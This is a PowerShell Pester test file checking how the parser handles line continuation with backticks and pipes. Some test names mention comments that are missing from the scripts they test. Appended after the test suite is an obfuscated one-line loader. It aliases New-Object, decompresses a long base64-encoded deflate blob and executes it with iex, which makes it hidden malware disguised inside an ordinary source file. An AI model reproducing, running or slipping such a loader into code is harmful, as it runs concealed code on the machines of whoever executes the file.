


Describe 'Line Continuance' -Tags 'CI' {
    BeforeAll {
        function ExecuteCommand {
            param ([string]$command)
            [powershell]::Create().AddScript($command).Invoke()
        }

        $whitespace = "`t `f`v$([char]0x00a0)$([char]0x0085)"
    }

    Context 'Lines ending with a backtick that parse and execute without error' {
        It 'Lines ending with a single backtick' {
            $script = @'
'Hello' + `
    ' world'
'@
            ExecuteCommand $script | Should -BeExactly 'Hello world'
        }

        It 'Lines ending with a single backtick followed only by a CR (old-style Mac line ending)' {
            $script = "'Hello' + ```r' world'"
            ExecuteCommand $script | Should -Be 'Hello world'
        }

        It 'Lines ending with a single backtick followed by whitespace' {
            $script = @'

'Hello' + `
'@ + $whitespace + @'

    ' world'
'@
            ExecuteCommand $script | Should -Be 'Hello world'
        }

        It 'Lines ending with a single backtick followed by whitespace and a comment' {
            $script = @'
'Hello' + ` 
    ' world'
'@
            ExecuteCommand $script | Should -Be 'Hello world'
        }

        It 'Lines ending with a single backtick followed by a comment line and then the continued line' {
            $script = @'
'Hello' + `

    ' world'
'@
            ExecuteCommand $script | Should -Be 'Hello world'
        }
    }

    Context 'Lines ending with a backtick that do not parse' {
        It 'Lines ending with a single backtick followed immediately by a comment' {
            $script = @'
'Hello' + `
    ' world'
'@
            $err = { ExecuteCommand $script } | Should -Throw -ErrorId 'ParseException' -PassThru
            $err.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'ExpectedValueExpression'
        }

        It 'Lines ending with two backticks' {
            $script = @'
'Hello' + ``
    ' world'
'@
            $err = { ExecuteCommand $script } | Should -Throw -ErrorId 'ParseException' -PassThru
            $err.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'ExpectedValueExpression'
        }
    }

    Context 'Lines ending with a pipe that parse and execute without error' {
        It 'Lines ending with a pipe' {
            $script = @'
'Hello' |
    ForEach-Object {"$_ world"}
'@
            ExecuteCommand $script | Should -Be 'Hello world'
        }

        It 'Lines ending with a pipe followed only by a CR (old-style Mac line ending)' {
            $script = "'Hello' |`r    ForEach-Object {`"`$_ world`"}"
            ExecuteCommand $script | Should -Be 'Hello world'
        }

        It 'Lines ending with a pipe followed by whitespace' {
            $script = @'

'Hello' |
'@ + $whitespace + @'

    ForEach-Object {"$_ world"}
'@
            ExecuteCommand $script | Should -Be 'Hello world'
        }

        It 'Lines ending with a pipe followed by a comment' {
            $script = @'
'Hello' |
    ForEach-Object {"$_ world"}
'@
            ExecuteCommand $script | Should -Be 'Hello world'
        }

        It 'Lines ending with a pipe followed by a comment line and then the continued command' {
            $script = @'
'Hello' |

    ForEach-Object {"$_ world"}
'@
            ExecuteCommand $script | Should -Be 'Hello world'
        }
    }

    Context 'Lines ending with a pipe that do not parse' {
        It 'Lines ending with a single pipe followed by an empty line' {
            $script = @'
'Hello' |

'@
            $err = { ExecuteCommand $script } | Should -Throw -ErrorId 'ParseException' -PassThru
            $err.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'EmptyPipeElement'
        }

        It 'Lines ending with a single pipe followed by a line that starts with a pipe' {
            $script = @'
'Hello' |
    |

'@
            $err = { ExecuteCommand $script } | Should -Throw -ErrorId 'ParseException' -PassThru
            $err.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'EmptyPipeElement'
        }
    }

    Context 'Parsing and executing without error while using a pipe at the beginning of a line to continue the previous line' {
        It 'Line continuance using a pipe at the start of a subsequent line' {
            $script = @'
'Hello'
    | ForEach-Object {"$_ world"}
'@
            ExecuteCommand $script | Should -BeExactly 'Hello world'
        }

        It 'Line continuance using a pipe at the start of a subsequent line after a CR (old-style Mac line ending)' {
            $script = "'Hello'`r    | ForEach-Object {`"`$_ world`"}"
            ExecuteCommand $script | Should -BeExactly 'Hello world'
        }

        It 'Longer line continuance using pipes at the start of subsequent lines' {
            $script = @'
1..10
    | ForEach-Object {($_ -shl 1) + $_}
    | Where-Object {$_ % 2 -eq 0}
    | Sort-Object -Descending
'@
            ExecuteCommand $script | Should -Be @(30, 24, 18, 12, 6)
        }

        It 'Line continuance using a comment line followed by a pipe at the start of a subsequent line' {
            $script = @'
'Hello'
    
    | ForEach-Object {"$_ world"}
'@
            ExecuteCommand $script | Should -BeExactly 'Hello world'
        }

        It 'Longer line continuance using pipes at the start of subsequent lines (with comments)' {
            $script = @'
1..10
    
    | ForEach-Object {($_ -shl 1) + $_}
    
    | Where-Object {$_ % 2 -eq 0}
    
    | Sort-Object -Descending
'@
            ExecuteCommand $script | Should -Be @(30, 24, 18, 12, 6)
        }

        It 'Line continuance using a pipe on a line by itself' {
            $script = @'
'Hello'
    |
    ForEach-Object {"$_ world"}
'@
            ExecuteCommand $script | Should -BeExactly 'Hello world'
        }


        It 'Longer line continuance using pipes on lines by themselves' {
            $script = @'
1..10
    |
    ForEach-Object {($_ -shl 1) + $_}
    |
    Where-Object {$_ % 2 -eq 0}
    |
    Sort-Object -Descending
'@
            ExecuteCommand $script | Should -Be @(30, 24, 18, 12, 6)
        }

        It 'Line continuance using a pipe on a line by itself (with comments)' {
            $script = @'
'Hello'
    |
    
    ForEach-Object {"$_ world"}
'@
            ExecuteCommand $script | Should -BeExactly 'Hello world'
        }

        It 'Longer line continuance using pipes on lines by themselves (with comments)' {
            $script = @'
1..10
    |
    
    ForEach-Object {($_ -shl 1) + $_}
    |
    
    Where-Object {$_ % 2 -eq 0}
    |
    
    Sort-Object -Descending
'@
            ExecuteCommand $script | Should -Be @(30, 24, 18, 12, 6)
        }
    }

    Context 'Lines starting with a pipe that do not parse' {
        It 'Lines starting with a single pipe with nothing after it' {
            $script = @'
'Hello'
    | 

'@
            $err = { ExecuteCommand $script } | Should -Throw -ErrorId 'ParseException' -PassThru
            $err.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'EmptyPipeElement'
        }

        It 'Lines starting with a single pipe with blank lines after it' {
            $script = @'
'Hello'
    |


'@
            $err = { ExecuteCommand $script } | Should -Throw -ErrorId 'ParseException' -PassThru
            $err.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'EmptyPipeElement'
        }

        It 'Lines starting with a single pipe that have a blank line before it' {
            $script = @'
'Hello'

    | ForEach-Object {"$_ world"}

'@
            $err = { ExecuteCommand $script } | Should -Throw -ErrorId 'ParseException' -PassThru
            $err.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'EmptyPipeElement'
        }

        It 'Lines starting with a single pipe that have a line with whitespace before it' {
            $script = @"
'Hello'
$whitespace
    | ForEach-Object {"`$_ world"}
"@
        $err = { ExecuteCommand $script } | Should -Throw -ErrorId 'ParseException' -PassThru
            $err.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'EmptyPipeElement'
        }

        It 'Lines starting with a single pipe that have a line with nothing but a backtick before it' {
            $script = @'
'Hello'
    `
    | ForEach-Object {"$_ world"}

'@
            $err = { ExecuteCommand $script } | Should -Throw -ErrorId 'ParseException' -PassThru
            $err.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'EmptyPipeElement'
        }

    }
}

sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

